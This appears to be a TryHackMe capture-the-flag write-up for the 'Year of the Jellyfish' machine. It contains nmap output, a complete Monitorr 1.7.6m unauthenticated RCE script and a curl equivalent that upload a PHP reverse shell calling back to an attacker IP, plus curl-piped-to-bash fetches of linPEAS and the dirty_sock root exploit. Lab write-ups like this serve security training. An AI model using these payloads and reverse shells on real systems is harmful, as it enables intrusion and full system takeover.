# Year of the Jellyfish
![[Screenshot 2021-04-27 at 5.57.48 PM.png]]
```
Be warned -- this box deploys with a public IP. Think about what that means for how you should approach this challenge. ISPs are often unhappy if you enumerate public IP addresses at a high speed...
```

## nmap

```sql
└─$ nmap -sC -sV -oA namp 34.244.217.52
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 16:56 IST
Nmap scan report for ec2-34-244-217-52.eu-west-1.compute.amazonaws.com (34.244.217.52)
Host is up (0.15s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)
80/tcp   open  http     Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to https://robyns-petshop.thm/
443/tcp  open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Robyn&#039;s Pet Shop
| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
| Not valid before: 2021-04-26T11:25:37
|_Not valid after:  2022-04-26T11:25:37
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
8000/tcp open  http-alt
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 15
|_    Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.91%I=7%D=4/26%Time=6086A389%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,3F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x2
SF:015\r\n\r\n400\x20Bad\x20Request");
Service Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.94 seconds
```

## nmap -full

```sql
└─$ nmap -p- -oN nmap_full 3.249.252.29                                                                        130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 23:11 IST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Ping Scan Timing: About 100.00% done; ETC: 23:11 (0:00:00 remaining)
Nmap scan report for robyns-petshop.thm (3.249.252.29)
Host is up (0.22s latency).
Not shown: 65528 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
8000/tcp  open  http-alt
8096/tcp  open  unknown
22222/tcp open  easyengine

Nmap done: 1 IP address (1 host up) scanned in 845.46 seconds
```

## web-pages
port 80
![[Screenshot 2021-04-26 at 5.06.43 PM.png]]

port 8000
![[Screenshot 2021-04-26 at 5.07.04 PM.png]]

port 443 (https)
![[Screenshot 2021-04-26 at 5.09.20 PM.png]]


## alternate dns
https://monitorr.robyns-petshop.thm
https://beta.robyns-petshop.thm
https://dev.robyns-petshop.thm

## other ports
port 8096 jellyfin 
3.249.252.29:8096


![[Screenshot 2021-04-26 at 11.19.00 PM.png]]


## exploit
1.7.6m monitorr exploit

RCE: https://www.exploit-db.com/exploits/48980
here we have can upload a image 

so we have to prepare a php file with image encoding and then upload it. 
and the thing to be taken care is that there is a extra parameter/header to be taken care of when uploading the file ie. the `"Cookie: isHuman=1"`
You can see it when intercepting the requests in BurpSuite

I initially edited the given exploit, but it was not uploading the shell. 
and after tweaking the shell file name and changing the listen port to 443(there could be a firewall) it worked

Here the shell was uploaded with `.png.pHp` but is stored with `.png.php` extension in server.

```python
#!/usr/bin/python
# -*- coding: UTF-8 -*-

# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
# Date: September 12, 2020
# Exploit Author: Lyhin's Lab
# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
# Software Link: https://github.com/Monitorr/Monitorr
# Version: 1.7.6m
# Tested on: Ubuntu 19

import requests
import os
import sys

if len (sys.argv) != 4:
	print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
else:
	url = sys.argv[1] + "/assets/php/upload.php"
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745", "Origin": sys.argv[1], "Connection": "close", "Referer": sys.argv[1], "Cookie": "isHuman=1"}

	data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"shell1.png.pHp\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"/bin/bash -c 'bash -i >& /dev/tcp/"+sys.argv[2] +"/" + sys.argv[3] + " 0>&1'\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"
	requests.post(url, verify=False, headers=headers, data=data)

	print ("A shell script should be uploaded. Now we try to execute it")
	url = sys.argv[1] + "/assets/data/usrimg/shell1.png.php"
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
	requests.get(url, headers=headers, verify=False)

```

![[Screenshot 2021-04-27 at 5.48.21 PM.png]]
![[Screenshot 2021-04-27 at 5.48.32 PM.png]]


or use curl 

```bash
#prepare the php rev shell file
echo -e $'\x89\x50\x4e\x47\x0d\x0a\x1a\n<?php echo system("bash -c \'bash -i >& /dev/tcp/10.17.4.208/443 0>&1\'");' > shell.png.pHp

#uploading the file
curl -k -F "fileToUpload=@./shell.png.pHp" https://monitorr.robyns-petshop.thm/assets/php/upload.php -H "Cookie: isHuman=1"        

#calling the shell file
curl -k https://monitorr.robyns-petshop.thm/assets/data/usrimg/shell.png.php
```

![[Screenshot 2021-04-27 at 3.55.25 PM.png]]

![[Screenshot 2021-04-27 at 3.55.37 PM.png]]

![[Screenshot 2021-04-27 at 3.55.48 PM.png]]

## flag1
![[Screenshot 2021-04-27 at 4.32.05 PM.png]]

`user flag === THM{YjljMDYyZWUxYmQwMTkxYjNlMDY4YmY5}`

## root

since it have a public ip 

linpeas
`curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | bash
`

![[Screenshot 2021-04-27 at 4.41.26 PM.png]]

`10:20   0:00 /usr/lib/snapd/snapd`

![[Screenshot 2021-04-27 at 4.42.36 PM.png]]

2 CVEs??
![[Screenshot 2021-04-27 at 4.47.29 PM.png]]

CVE-2002-1614
CVE-2011-1485

linux exploit suggester
`curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash`

![[Screenshot 2021-04-27 at 4.52.52 PM.png]]

now we are going to use the dirty sock exploit, as i have used it before and it works so good. and snapd is working too with version   2.32.5+18.04
Excellent

`curl https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py | python3`


![[Screenshot 2021-04-27 at 4.56.59 PM.png]]

got dirty_sock as root

![[Screenshot 2021-04-27 at 4.57.31 PM.png]]


![[Screenshot 2021-04-27 at 4.59.08 PM.png]]

`root flag == THM{ZWM5N2ViY2QxNjE4MjkxOWRiYWQ4NjUx}`

